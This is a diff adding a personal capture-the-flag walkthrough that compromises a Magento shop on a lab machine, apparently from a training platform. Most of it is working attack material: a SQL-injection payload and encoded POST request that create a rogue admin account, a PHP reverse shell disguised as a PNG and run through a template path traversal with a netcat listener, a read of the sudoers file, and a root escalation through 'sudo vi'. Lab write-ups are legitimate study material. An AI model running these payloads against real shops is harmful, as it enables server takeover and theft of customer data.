@@ -1,0 +1,206 @@
+Apache/2.4.18 (Ubuntu) Server
+Running an eCommerce website using Magneto
+
+gobuster dir -u http://10.10.10.140:80 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+/app (Status: 301)
+/errors (Status: 301)
+/favicon.ico (Status: 200)
+/includes (Status: 301)
+/index.php (Status: 200)
+/js (Status: 301)
+/lib (Status: 301)
+/media (Status: 301)
+/pkginfo (Status: 301)
+/shell (Status: 301)
+/skin (Status: 301)
+/var (Status: 301)
+/y (Status: 200)
+
+http://10.10.10.140/var/ has a lot of juicy stuff
+
+http://10.10.10.140/var/export/
+ID,"Search Query",Results,Hits
+
+http://10.10.10.140/var/report/189774146508
+/var/www/html/lib/Varien/Http/Client.php(61): Zend_Http_Client->request('GET')
+#1 /var/www/html/app/code/core/Mage/Adminhtml/controllers/DashboardController.php(99): Varien_Http_Client->request('GET')
+#2 /var/www/html/app/code/core/Mage/Core/Controller/Varien/Action.php(418): Mage_Adminhtml_DashboardController->tunnelAction()
+#3 /var/www/html/app/code/core/Mage/Core/Controller/Varien/Router/Standard.php(250): Mage_Core_Controller_Varien_Action->dispatch('tunnel')
+#4 /var/www/html/app/code/core/Mage/Core/Controller/Varien/Front.php(172): Mage_Core_Controller_Varien_Router_Standard->match(Object(Mage_Core_Controller_Request_Http))
+#5 /var/www/html/app/code/core/Mage/Core/Model/App.php(354): Mage_Core_Controller_Varien_Front->dispatch()
+#6 /var/www/html/app/Mage.php(684): Mage_Core_Model_App->run(Array)
+#7 /var/www/html/index.php(87): Mage::run('', 'store')
+#8 {main}";s:3:"url";s:597:"/index.php/admin/dashboard/tunnel
+
+10.10.10.140/js
+SYNTAX: index.php/x.js?f=dir1/file1.js,dir2/file2.js
+
+http://10.10.10.140/var/session/
+Download a session nad unzip it
+chmod 777 15*
+tar -xzvf 15*
+You should have a var folder now
+cd var
+chmod 777 1568378147_db
+Unzip it
+gunzip 1568378147_db
+
+Lots of juicy DB table info 
+
+GAINING ACCESS TO ADMIN DASHBOARD:
+1. Access the admin dashboard at: 
+http://10.10.10.140/index.php/admin/dashboard/tunnel
+
+Side note:
+Per this SO link :
+https://magento.stackexchange.com/questions/231135/what-is-the-default-magento-admin-username-and-password
+The default creds are admin / 123123 but that doesn't work. 
+
+2. Afte research on Magento exploits, we can give ourself access to the admin dashboard per this exploit:
+https://www.exploit-db.com/exploits/37977
+
+We will reprduce the above exploit manually.with the creds keefer / reefer using python
+3. Paste the below sql into tmp.txt
+
+SET @SALT = 'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
+
+4. Trim the newline characters:
+tr -d '\n' < tmp.txt 
+
+5. Launch python and store the output from step 3 into the variable q
+python
+>>> q = "SET @SALT = 'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');"
+>>> print q
+>>> query = q.format(username="keefer", password="reefer")
+>>> print query
+>>> pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
+>>> print pfilter
+>>> import base64
+>>> filter = base64.b64encode(pfilter)
+>>> print filter
+
+Issue a POST request with data:
+___directive
+filter
+forwarded
+
+6. Create Admin Creds by POSTing the below request. Using the contents from the variable filter above.
+#####################################################################
+POST /index.php/admin/Cms_Wysiwyg/directive/index/ HTTP/1.1
+
+Host: 10.10.10.140
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://10.10.10.140/index.php/admin/
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 1003
+
+Cookie: frontend=74fma967d042iqnfeneql1ksr1; external_no_cache=1; adminhtml=af79gttnmb28e4an1rg5ufqdh3
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+
+
+___directive=e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&filter=cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdyZWVmZXInKSApLCBDT05DQVQoJzonLCBAU0FMVCApKTtTRUxFQ1QgQEVYVFJBIDo9IE1BWChleHRyYSkgRlJPTSBhZG1pbl91c2VyIFdIRVJFIGV4dHJhIElTIE5PVCBOVUxMO0lOU0VSVCBJTlRPIGBhZG1pbl91c2VyYCAoYGZpcnN0bmFtZWAsIGBsYXN0bmFtZWAsYGVtYWlsYCxgdXNlcm5hbWVgLGBwYXNzd29yZGAsYGNyZWF0ZWRgLGBsb2dudW1gLGByZWxvYWRfYWNsX2ZsYWdgLGBpc19hY3RpdmVgLGBleHRyYWAsYHJwX3Rva2VuYCxgcnBfdG9rZW5fY3JlYXRlZF9hdGApIFZBTFVFUyAoJ0ZpcnN0bmFtZScsJ0xhc3RuYW1lJywnZW1haWxAZXhhbXBsZS5jb20nLCdrZWVmZXInLEBQQVNTLE5PVygpLDAsMCwxLEBFWFRSQSxOVUxMLCBOT1coKSk7SU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChwYXJlbnRfaWQsdHJlZV9sZXZlbCxzb3J0X29yZGVyLHJvbGVfdHlwZSx1c2VyX2lkLHJvbGVfbmFtZSkgVkFMVUVTICgxLDIsMCwnVScsKFNFTEVDVCB1c2VyX2lkIEZST00gYWRtaW5fdXNlciBXSEVSRSB1c2VybmFtZSA9ICdrZWVmZXInKSwnRmlyc3RuYW1lJyk7&forwarded=1
+#####################################################################
+The response will contain a png
+
+
+GETTING A SHELL:
+7. cp /usr/share/webshells/php/php-reverse-shell.php .
+Edit the shell with tun0 ip and port 80
+mv php-reverse-shell.php ./webshell.php.png
+
+8. Create a new category
+http://10.10.10.140/index.php/admin/catalog_category/index/key/fe2a5f7c44cba82274664ff0094c461b/
+Upload webshell.php.png as the image
+Save
+Confirm it is exists at:
+http://10.10.10.140/media/catalog/category/
+
+9. Allow symlinks:
+System > configuration > Developer > Template Settings > Allow Symlinks > Yes
+
+10. Now create a new newsletter template
+http://10.10.10.140/index.php/admin/newsletter_template/new/key/33a4c3a8feba504020d9b4fabc0775e2/
+Inside the Template Content field paste:
+{{block type='core/template' template='../../../../../../media/catalog/category/cat.php.png'}}
+
+11. Setup nc listener and click Preview Template
+This should send back a reverse shell
+
+12. cat /home/user.txt
+a448877277e82f05e5ddf9f90aefbac8
+
+This executes the php file as a raw php file so the code doesn't need to be embedded inside the image. Simply needs to png extension to bypass
+file upload restriction.
+
+GETTING ROOT:
+1. Checksudo privileges, we cat the sudoers file
+$ cat /etc/sudoers
+
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults	env_reset
+Defaults	mail_badpass
+Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo	ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+
+www-data ALL=NOPASSWD:/usr/bin/vi /var/www/html/*
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+2. List sudoers
+$ sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+2. We see that we can run vi with sudo privs for files exclusively in /var/www/html
+3. Spawn up vi for a file in the html directory
+sudo vi /var/www/html/AAA.sh
+
+5. Inside vi, launch /bin/sh:
+:!/bin/sh
+
+6. We have root.
+cat /root/root.txt
+c2b087d66e14a652a3b86a130ac56721
